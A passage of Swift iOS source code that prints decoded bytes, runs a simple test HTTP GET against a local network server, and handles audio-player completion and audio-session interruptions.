            print(NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String)
        }
        
        
        
//        print("message type:" + mms_type)
//        
//        var result1 = NSString(bytes: the_bytes, length: the_bytes.count, encoding: NSUTF8StringEncoding ) as! String
//        print("the_message:"+result1)
        
        
    }
    
    
    
    
    func httpTest()
    {
        let url:URL = URL(string: "https://192.168.1.219:3000/")!
        let session = URLSession.shared
        
        let request = NSMutableURLRequest(url: url)
        //request.HTTPMethod = "POST"
        request.cachePolicy = NSURLRequest.CachePolicy.reloadIgnoringCacheData
        
        // let paramString = "data=Hello"
        // request.HTTPBody = paramString.dataUsingEncoding(NSUTF8StringEncoding)
        
        let task = session.dataTask(with: request as URLRequest, completionHandler: {
            (
            data, response, error) in
            
            guard let _:Data = data, let _:URLResponse = response, error == nil else {
                print("error")
                return
            }
            
            let dataString = NSString(data: data!, encoding: String.Encoding.utf8.rawValue)
            print(dataString)
            
        }) 
        
        task.resume()
        
        
        
        
    }
    
    
    func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer,
        successfully flag: Bool){
            
            print("Finished playing the song")
            
            /* The flag parameter tells us if the playback was successfully
            finished or not */
            if player == audioPlayer{
                audioPlayer = nil
            }
            
    }
    
    // Audio
    func handleInterruption(_ notification: Notification){
        /* Audio Session is interrupted. The player will be paused here */
        
        let interruptionTypeAsObject =
        notification.userInfo![AVAudioSessionInterruptionTypeKey] as! NSNumber
        
        let interruptionType = AVAudioSessionInterruptionType(rawValue:
            interruptionTypeAsObject.uintValue)
        
        if let type = interruptionType{
            if type == .ended{
                
                /* resume the audio if needed */
                
            }
        }
        
    }
    
    
    
    
    
    
}
